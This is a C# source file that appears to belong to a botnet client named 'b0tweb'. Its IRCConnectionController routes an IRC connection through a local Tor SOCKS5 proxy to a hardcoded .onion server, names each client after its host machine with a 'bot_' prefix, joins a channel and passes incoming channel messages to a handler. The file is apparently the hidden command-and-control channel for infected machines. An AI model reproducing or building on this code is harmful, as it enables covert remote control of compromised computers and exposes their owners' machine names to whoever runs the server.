using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Meebey.SmartIrc4net;

namespace b0tweb
{
    /// <summary>
    /// Class <c>IRCConnectionController</c> handles the IRC connection established.
    /// The IRC connection is made via Tor to make everything as secure as possible.
    /// </summary>
    class IRCConnectionController
    {
        /// <summary>
        /// The IRC client from <c>SmartIrc4Net</c>
        /// </summary>
        private IrcClient _irc;

        /// <summary>
        /// The Tor server to connect to.
        /// </summary>
        private const string _server = "botwebzoqpduhxj7hgbu2f6vooyj3lt3q6f6lxir7wb7xjilmvbzkzid.onion";

        /// <summary>
        /// The IRC port to use for the connection.
        /// </summary>
        private const int _port = 6667;

        /// <summary>
        /// The proxy host address of the Tor proxy server.
        /// </summary>
        private const string _proxyHost = "localhost";

        /// <summary>
        /// The proxy host port of the Tor proxy server.
        /// </summary>
        private const int _proxyPort = 9150;

        /// <summary>
        /// The proxy type of the Tor proxy server.
        /// </summary>
        private const ProxyType _proxyType = ProxyType.Socks5;

        /// <summary>
        /// The Nickname of the client.
        /// </summary>
        private string _nick;

        /// <summary>
        /// The real name of the client.
        /// </summary>
        private string _realName;

        /// <summary>
        /// Construct a new <c>IRCConnectionController</c>.
        /// </summary>
        IRCConnectionController()
        {
            Random rand = new Random();
            this._irc = new IrcClient();
            this._nick = "bot_" + System.Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
            this._realName = this._nick + "_real";

            this._irc.ProxyHost = IRCConnectionController._proxyHost;
            this._irc.ProxyPort = IRCConnectionController._proxyPort;
            this._irc.ProxyType = IRCConnectionController._proxyType;
        }

        /// <summary>
        /// Gets the IRC nickname for this client.
        /// </summary>
        public String Nick
        {
            get
            {
                return this._nick;
            }
        }

        /// <summary>
        /// Binds the <c>OnChannelMessage</c> event handler to the <c>callback</c> given.
        /// </summary>
        /// <param name="callback">The event handler to execute on a channel message receive.</param>
        public void AddMessageHandler (IrcEventHandler callback)
        {
            this._irc.OnChannelMessage += callback;
        }

        /// <summary>
        /// Joins a channel given by the <c>channel</c> parameter.
        /// </summary>
        /// <param name="channel">The channel to join.</param>
        public void Join(string channel)
        {
            this._irc.Connect(_server, _port);
            this._irc.Login(_nick, _realName);
            this._irc.RfcJoin(channel);
        }

        /// <summary>
        /// Listen to incoming events from the IRC server.
        /// </summary>
        public void Listen()
        {
            this._irc.Listen();
        }
    }
}
